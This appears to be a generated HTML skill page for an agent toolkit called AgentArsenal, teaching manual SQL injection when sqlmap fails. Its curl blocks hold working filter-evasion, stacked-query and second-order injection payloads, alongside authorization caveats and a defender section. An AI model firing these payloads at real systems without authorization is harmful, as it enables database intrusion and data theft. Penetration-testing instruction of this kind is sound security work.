@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: sqli-manual-fallback</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>sqli-manual-fallback</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when sqlmap or scanners fail against a SQL injection point</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">requires:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-xss.html">web-xss</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>curl</td><td>8.5</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Manual fallback is the operator skill underneath the tooling: crafting payloads by hand when sqlmap cannot confirm or exploit an injection. This skill covers hand-built filter evasion, stacked queries, second-order testing, and the judgment to stop when a point is genuinely not exploitable. Use it on authorized tests when automation fails, not as a first resort; manual work is slower and noisier per finding, but it catches what signatures miss.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Reproduce the exact manual probe that automation could not, in Burp</li>
+<p>Repeater, and save it.</p>
+<li>Identify what blocks automation: keyword filter, WAF signature, encoding</li>
+<p>issue, or session handling.</p>
+<li>Build minimal bypass payloads by hand, changing one thing at a time.</li>
+<li>Confirm the bypass with the smallest observable difference, then expand</li>
+<p>to extraction.</p>
+<li>Extract with hand-built UNION or blind payloads, keeping request counts</li>
+<p>low.</p>
+<li>Document the bypass technique and the exact failing automation command</li>
+<p>for the report.</p>
+</ol>
+<h2>1. Hand-built filter evasion</h2>
+<p>Change one thing per request so you learn which transformation defeats the filter.</p>
+<pre><code class="language-bash"># Case variation defeats naive keyword blacklists
+curl -s &quot;https://target.example/item?id=-5%20UnIoN%20SeLeCt%201,2,3--%20-&quot;
+
+# Inline comments break keyword signatures (MySQL)
+curl -s &quot;https://target.example/item?id=-5%20UN/**/ION%20SEL/**/ECT%201,2,3--%20-&quot;
+
+# Tab and newline as whitespace when spaces are stripped
+curl -s &quot;https://target.example/item?id=-5%09UNION%09SELECT%091,2,3--%20-&quot;
+
+# BETWEEN instead of = when the equals sign is filtered
+curl -s &quot;https://target.example/item?id=5%20AND%201%20BETWEEN%201%20AND%201--%20-&quot;
+
+# CHAR() construction avoids quoted strings entirely (MSSQL)
+# ... WHERE name = CHAR(97,100,109,105,110)  -- spells &#x27;admin&#x27;</code></pre>
+<p>Test each variant against a control (<code>AND 1=1</code> versus <code>AND 1=2</code>) so you know the variant executes rather than just not erroring.</p>
+<h2>2. Stacked queries by hand</h2>
+<p>When the driver allows multiple statements, the second statement is yours.</p>
+<pre><code class="language-bash"># MSSQL stacked probe: delay only if stacking works
+time curl -s &quot;https://target.example/item?id=5%3BWAITFOR%20DELAY%20&#x27;0:0:3&#x27;--%20-&quot; -o /dev/null
+
+# PostgreSQL stacked probe
+time curl -s &quot;https://target.example/item?id=5%3BSELECT%20pg_sleep(3)--%20-&quot; -o /dev/null
+
+# Stacked update as impact proof (only with explicit permission, on a
+# non-production target, and reverted immediately)
+# id=5;UPDATE users SET bio=&#x27;probe&#x27; WHERE username=&#x27;testuser&#x27;-- -</code></pre>
+<p>Stacked queries are the highest-risk manual technique because they can modify data. Treat any stacked write as requiring the same approval as <code>--os-shell</code> in sqlmap, and revert test changes before you leave.</p>
+<h2>3. Second-order manual testing</h2>
+<p>Store the payload with one request, trigger it with another.</p>
+<pre><code class="language-bash"># Step 1: register a username containing a boolean probe
+curl -s -X POST &#x27;https://target.example/register&#x27; \
+  -d &quot;user=test&#x27; AND &#x27;1&#x27;=&#x27;1&amp;pass=Password1!&quot; -o /tmp/reg.html
+
+# Step 2: visit every page that renders the username
+for page in profile admin/users orders/history; do
+  echo &quot;== $page ==&quot;
+  curl -s &quot;https://target.example/$page&quot; -b /tmp/cookies.txt \
+    | grep -i -E &#x27;sql|syntax|error&#x27; | head -3
+done
+
+# Step 3: boolean second-order, compare two registrations
+curl -s -X POST &#x27;https://target.example/register&#x27; \
+  -d &quot;user=probe_true&#x27; AND &#x27;1&#x27;=&#x27;1&amp;pass=Password1!&quot;
+curl -s -X POST &#x27;https://target.example/register&#x27; \
+  -d &quot;user=probe_false&#x27; AND &#x27;1&#x27;=&#x27;2&amp;pass=Password1!&quot;
+# Log in as each and diff a page that lists the username</code></pre>
+<p>Second-order payloads often execute far from the injection point (admin panels, exports, reports), so widen the crawl beyond the obvious pages.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The bypass works once, then stops. The WAF learned the pattern or the</li>
+<p>session was flagged; rotate the technique, not just the payload.</p>
+<li>Manual payloads get mangled by double URL encoding. Send through Burp</li>
+<p>Repeater where you control the exact bytes, and compare with what curl sends via <code>--trace-ascii</code>.</p>
+<li>The application normalizes input (lowercases, strips comments) before the</li>
+<p>query. Test normalization with a canary string and adapt the payload to survive it.</p>
+<li>You cannot tell whether the filter or the query broke. Build a truth</li>
+<p>table: run each payload with <code>1=1</code> and <code>1=2</code> variants and record which pairs differ.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Every bypass is blocked: the filter may be a positive allow-list (only</li>
+<p>digits accepted). Confirm with non-SQL metacharacters; if the app truly allow-lists, the point is not injectable and you move on.</p>
+<li>You suspect a filter bypass exists but cannot find it: time-box the</li>
+<p>effort (for example one hour), then record the unexploited suspicion with the evidence and move to the next target.</p>
+<li>Manual extraction is too slow: once you have one working bypass primitive,</li>
+<p>feed the exact working request to sqlmap with <code>--tamper</code> disabled and a custom prefix or suffix via <code>--prefix</code> and <code>--suffix</code>.</p>
+<li>The finding needs exploit code for the report: write the minimal stdlib</li>
+<p>Python proof of concept, no bigger than needed to reproduce.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see manual testing as slower, more varied probing than tool bursts: irregular timing, creative encodings, and payloads that mutate between requests. It is harder to signature than sqlmap but still shows up as anomalous input in logs. The defense does not change: parameterized queries, positive input validation, and logging with alerting on database errors. Manual skill is exactly why allow-list validation beats block-list filtering.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>CWE-89 (Improper Neutralization of Special Elements used in an SQL</li>
+<p>Command, SQL Injection).</p>
+<li>CWE-20 (Improper Input Validation).</li>
+<li>OWASP Testing Guide: Testing for SQL Injection (OTG-INPVAL-005).</li>
+<li>PortSwigger Web Security Academy: SQL injection filter bypass labs.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
